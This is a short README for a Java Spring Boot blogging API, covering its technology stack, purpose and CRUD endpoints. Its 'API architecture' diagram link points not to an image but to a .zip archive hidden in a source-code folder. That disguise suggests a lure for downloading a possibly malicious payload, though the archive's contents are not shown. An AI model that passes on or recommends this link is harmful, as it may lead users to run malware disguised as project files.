# Blogging-API
This API is meant to create an interface for users that want to create a blogging system, it is based on basic CRUD operations.
By implementing the next stack, I'd learn to work with multiple levels of implementation aside working from a more Engineering oriented view.
Technology stack:
  1. Java: Main technology and language to implement OOPs principles is Java.
  2. Springboot: This framework prevents me from instantiating and creating all ***Spring*** configuration required.
  3. JPA: This technology provides a simple yet powerfull way to develop and persist data, along with H2
  4. H2: For local storage of data and database management.
  5. Other: Lombok for code reuse in models and to prevent writing common constructors, getters, setters and toString methods. LSF4J for logging, as logging would help debug and testing.

#### Purpose of this project:
What I want to achieve by creating, designing, developing, testing and deploying (In local for now) this solution is to showcase my ability
to code a simple yet robust solution that implements latest trends, technologies and more.

##### API Architecture diagram
  By following MVC pattern, we follow next architecture definition: 
![API architecture](https://raw.githubusercontent.com/MilaCodesIt/Blogging-API/main/src/main/java/org/collision/Blogging_API_v2.9.zip)

##### Endpoints
  | HTTP Method | Operation | Description |
  |---|---|---|
  | POST | Create new blog entry | This endpint receives a body ***BlogEntry*** and register the new blog entry into database |
  | GET | Query a single element | This endpint receives an id ***id*** and retrieves the specified element from db if it exists |
  | GET | Query all elements | This endpoint retrieves all registers from the entry table in database |
  | PUT | Updates a registry by id | This endpoint receives an id ***id*** and updates specified registry in database |
  | POST | Deletes a registry by id | This endpoint receives an id ***id*** and deletes specified registry in database |


And that is the first part of this simple project... 

Next stage (Stage 2), add a front end system created with React to retrieve all posts and manage all posts.
